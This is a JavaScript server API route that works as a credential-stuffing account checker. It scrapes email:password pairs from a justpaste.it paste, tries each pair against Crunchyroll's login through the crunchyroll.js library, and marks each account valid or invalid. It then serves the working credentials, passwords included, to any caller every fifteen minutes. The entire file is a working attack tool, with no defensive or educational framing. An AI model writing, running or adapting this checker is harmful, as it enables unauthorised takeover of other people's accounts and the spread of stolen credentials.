/**
 * API that returns cached accounts or triggers a fetch/check if 15 minutes have passed
 * This is the ONLY endpoint the client calls - no checking happens on client side
 */

// Import the cache
let cachedData = {
  accounts: null,
  lastChecked: null,
  isChecking: false,
};

const FIFTEEN_MINUTES = 15 * 60 * 1000;

async function fetchAndCheckAccounts() {
  if (cachedData.isChecking) {
    console.log('Already checking, skip duplicate request');
    return;
  }
  
  cachedData.isChecking = true;
  
  try {
    console.log('Fetching accounts from justpaste.it...');
    const response = await fetch('https://justpaste.it/nia8c');
    const html = await response.text();
    
    // Extract email:password patterns
    const emailPasswordRegex = /([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,})[:\s]+([^\s<]+)/g;
    const matches = [];
    let match;
    
    while ((match = emailPasswordRegex.exec(html)) !== null) {
      matches.push({
        email: match[1],
        password: match[2]
      });
    }
    
    // Remove duplicates
    const uniqueAccounts = [];
    const seenEmails = new Set();
    
    for (const pair of matches) {
      if (!seenEmails.has(pair.email)) {
        seenEmails.add(pair.email);
        uniqueAccounts.push(pair);
      }
    }
    
    // Create account objects with checking status
    const newAccounts = uniqueAccounts.map((pair, idx) => ({
      id: `Acc${idx + 1}`,
      email: pair.email,
      password: pair.password,
      label: `Acc${idx + 1}`,
      status: 'checking',
      profileName: null,
      error: null,
    }));
    
    cachedData.accounts = newAccounts;
    cachedData.lastChecked = new Date().toISOString();
    
    console.log(`Fetched ${newAccounts.length} accounts, starting checks...`);
    
    // Check accounts one by one
    for (let i = 0; i < newAccounts.length; i++) {
      const acc = newAccounts[i];
      console.log(`Checking account ${i + 1}/${newAccounts.length}: ${acc.email}`);
      
      try {
        const cr = require('crunchyroll.js');
        delete require.cache[require.resolve('crunchyroll.js')];
        
        await cr.login(acc.email, acc.password);
        const profile = await cr.getProfile();
        
        try {
          if (typeof cr.logout === 'function') {
            await cr.logout();
          }
        } catch (logoutErr) {
          // Ignore
        }
        
        if (profile && typeof profile === 'object' && profile.code) {
          cachedData.accounts[i] = {
            ...acc,
            status: 'invalid',
            profileName: null,
            error: profile.code,
          };
        } else {
          const username = profile?.username || profile?.email || acc.label;
          cachedData.accounts[i] = {
            ...acc,
            status: 'valid',
            profileName: username,
            error: null,
          };
        }
      } catch (err) {
        cachedData.accounts[i] = {
          ...acc,
          status: 'invalid',
          profileName: null,
          error: err.message || 'Login failed',
        };
      }
      
      // Small delay between checks
      if (i < newAccounts.length - 1) {
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }
    
    console.log('All accounts checked!');
  } catch (err) {
    console.error('Failed to fetch/check accounts:', err);
  } finally {
    cachedData.isChecking = false;
  }
}

export default async function handler(req, res) {
  if (req.method !== 'GET') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  const now = new Date();
  
  // Check if we need to fetch new data
  if (!cachedData.lastChecked || !cachedData.accounts) {
    // No cache - fetch and check in background
    console.log('No cache found, triggering fetch...');
    fetchAndCheckAccounts(); // Don't await - return immediately
    return res.status(200).json({
      accounts: [],
      lastChecked: null,
      isChecking: true,
    });
  }
  
  const lastCheckedDate = new Date(cachedData.lastChecked);
  const timeSinceLastCheck = now - lastCheckedDate;
  
  if (timeSinceLastCheck >= FIFTEEN_MINUTES && !cachedData.isChecking) {
    // More than 15 minutes - trigger refresh in background
    console.log('15 minutes passed, triggering refresh...');
    fetchAndCheckAccounts(); // Don't await - return current data
  }
  
  // Always return current cached data
  return res.status(200).json({
    accounts: cachedData.accounts,
    lastChecked: cachedData.lastChecked,
    isChecking: cachedData.isChecking,
  });
}
